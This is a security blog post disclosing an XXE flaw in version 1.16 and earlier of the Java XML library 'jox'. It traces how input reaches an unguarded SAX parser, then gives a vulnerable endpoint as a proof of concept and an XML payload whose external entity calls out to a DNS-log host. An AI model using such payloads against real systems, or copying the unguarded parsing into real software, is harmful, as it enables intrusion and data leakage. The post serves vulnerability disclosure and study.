=== Content from novysodope.github.io_c2d24b41_20250114_194843.html ===

[**novy's Blog**](/)

* [首页](/)
* [归档](/archives/)
* [分类](/categories/)
* [标签](/tags/)
* [关于](/about/)
* [友情链接](/links/)
* [RSS](/rss2.xml)

novy

October 29, 2021 pm

2.3k 字

7 分钟

 次

# wutkajox XXE

A component found during a code audit at the customer site.
The affected version is <=1.16

<https://mvnrepository.com/artifact/com.wutka/jox/1.16>

According to the official demo, the data will first be passed to the readObject method of JOXBeanInputStream:
![](/images/64/1.png)
In the readObejct method of the object JOXBeanInputStream, the parameters will continue to be passed into the readObejct method of the JOXSAXBeanInput class for processing:
![](/images/64/2.png)
Follow up with the JOXSAXBeanInput class:
![](/images/64/3.png)
In the readObject method of this class, the parse method of SAXParser is called to directly parse the XML document. No other verification is performed, so that the malicious xml data can be used to trigger the vulnerability.

Vulnerability verification:
Reference dependencies in pom files:

| ``` 12345 ``` | ``` <dependency>      <groupId>com.wutka</groupId>      <artifactId>jox</artifactId>      <version>1.16</version>    </dependency> ``` |
| --- | --- |

Refer to the official to write a class that calls JOXBeanInputStream to parse xml:

| ``` 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758 ``` | ``` import java.io.ByteArrayInputStream;import com.wutka.jox.JOXBeanInputStream;import com.wutka.jox.JOXBeanOutputStream;import java.io.ByteArrayOutputStream;import java.io.IOException;/** * @Author novy * @Date 2021/10/22 11:22 * @Version 1.0 */    public class BeanXMLMapping {        /**         *         *         Retrieves a bean object for the         *         *         *         * received XML and matching bean class         */        public static Object fromXML(String xml, Class className) throws IOException {            ByteArrayInputStream xmlData = new ByteArrayInputStream(xml.getBytes());            JOXBeanInputStream joxIn = new JOXBeanInputStream(xmlData);            try {                return joxIn.readObject(className);            } catch (IOException exc) {                exc.printStackTrace();                return null;            } finally {                try {                    xmlData.close();                    joxIn.close();                } catch (Exception e) {                    e.printStackTrace();                }            }        } ``` |
| --- | --- |

POC:

| ``` 1234 ``` | ``` @RequestMapping("/jox")   public void joxxml(@RequestBody String req, HttpServletResponse response) throws IOException {       BeanXMLMapping aaa = new BeanXMLMapping();       aaa.fromXML(req,TestController.class);//TestController.class is arbitrary class added to meet the conditions ``` |
| --- | --- |

Finally, send the payload to trigger the vulnerability

| ``` 12345678 ``` | ``` <?xml version="1.0" encoding="utf-8"?><!DOCTYPE creds [        <!ELEMENT creds ANY >        <!ENTITY xxe SYSTEM "dnslog">        ]><creds>    &xxe;</creds> ``` |
| --- | --- |

![](/images/64/7.png)

Refer to:
[简单SAX解析详解全过程](https://blog.csdn.net/lsh364797468/article/details/51325540 "简单SAX解析详解全过程")

---

[JAVA](/categories/JAVA/)

[XXE](/tags/XXE/)

---

---

声明：
 本文章用于学习交流，严禁用于非法操作，出现后果一切自行承担，阅读此文章表示你已同意本声明。

 Disclaimer:
 This article is for study and communication. It is strictly forbidden to use it for illegal operations. All consequences shall be borne by yourself. Reading this article means that you have agreed to this statement.

[o2oa的任意文件读取
上一篇](/2021/11/01/65/)

[Log4j1.2.17 RCE
下一篇](/2021/10/28/63/)

 目录

![](/img/aa.png)

扫一扫关注我们

#### 搜索

×

关键词

© 2018-  novy`s Blog.  Powered by [Hexo](https://hexo.io)

本博客已经稳定运行：


